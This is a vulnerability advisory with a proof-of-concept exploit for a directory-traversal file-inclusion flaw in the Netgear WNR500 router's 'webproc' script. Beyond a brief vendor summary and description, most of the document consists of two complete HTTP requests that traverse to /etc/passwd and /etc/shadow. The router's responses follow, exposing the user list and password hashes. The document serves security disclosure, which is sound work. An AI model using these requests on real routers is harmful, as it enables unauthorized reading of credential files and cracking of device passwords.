Netgear Wireless Router WNR500 Parameter Traversal Arbitrary File Access Exploit


Vendor: NETGEAR
Product web page: http://www.netgear.com
Affected version: WNR500 (firmware: 1.0.7.2)

Summary: The NETGEAR compact N150 classic wireless router (WNR500) improves
your legacy Wireless-G network. It is a simple, secure way to share your
Internet connection and allows you to easily surf the Internet, use email,
and have online chats. The quick, CD-less setup can be done through a web
browser. The small, efficient design fits perfectly into your home.

Desc: The router suffers from an authenticated file inclusion vulnerability
(LFI) when input passed thru the 'getpage' parameter to 'webproc' script is
not properly verified before being used to include files. This can be exploited
to include files from local resources with directory traversal attacks.

Tested on: mini_httpd/1.19 19dec2003


Vulnerability discovered by Gjoko 'LiquidWorm' Krstic
                            @zeroscience


Advisory ID: ZSL-2014-5208
Advisory URL: http://www.zeroscience.mk/en/vulnerabilities/ZSL-2014-5208.php


16.11.2014

--


= 1 =============================================================

GET /cgi-bin/webproc?getpage=../../../etc/passwd&var:menu=advanced&var:page=null HTTP/1.1
Host: 192.168.1.1:8080
User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:32.0) Gecko/20100101 Firefox/32.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Cookie: sessionid=7dc3268b; auth=ok; expires=Sun, 15-May-2012 01:45:46 GMT; sessionid=7dc3268b; auth=ok; expires=Mon, 31-Jan-2050 16:00:00 GMT; language=en_us
Authorization: Basic YWRtaW46cGFzc3dvcmQ=
Connection: keep-alive

---

HTTP/1.0 200 OK
Content-type: text/html
Cache-Control: no-cache
set-cookie: sessionid=7dc3268b;
set-cookie: auth=ok;
set-cookie: expires=Sun, 15-May-2012 01:45:46 GMT;

#root:x:0:0:root:/root:/bin/bash
root:x:0:0:root:/root:/bin/sh
#tw:x:504:504::/home/tw:/bin/bash
#tw:x:504:504::/home/tw:/bin/msh


= 2 =============================================================

GET /cgi-bin/webproc?getpage=../../../etc/shadow&var:menu=advanced&var:page=null HTTP/1.1
Host: 192.168.1.1:8080
User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:32.0) Gecko/20100101 Firefox/32.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Cookie: sessionid=7dc3268b; auth=ok; expires=Sun, 15-May-2012 01:45:46 GMT; sessionid=7dc3268b; auth=ok; expires=Mon, 31-Jan-2050 16:00:00 GMT; language=en_us
Authorization: Basic YWRtaW46cGFzc3dvcmQ=
Connection: keep-alive

---

HTTP/1.0 200 OK
Content-type: text/html
Cache-Control: no-cache
set-cookie: sessionid=7dc3268b;
set-cookie: auth=ok;
set-cookie: expires=Sun, 15-May-2012 01:45:46 GMT;

#root:$1$BOYmzSKq$ePjEPSpkQGeBcZjlEeLqI.:13796:0:99999:7:::
root:$1$BOYmzSKq$ePjEPSpkQGeBcZjlEeLqI.:13796:0:99999:7:::
#tw:$1$zxEm2v6Q$qEbPfojsrrE/YkzqRm7qV/:13796:0:99999:7:::
#tw:$1$zxEm2v6Q$qEbPfojsrrE/YkzqRm7qV/:13796:0:99999:7:::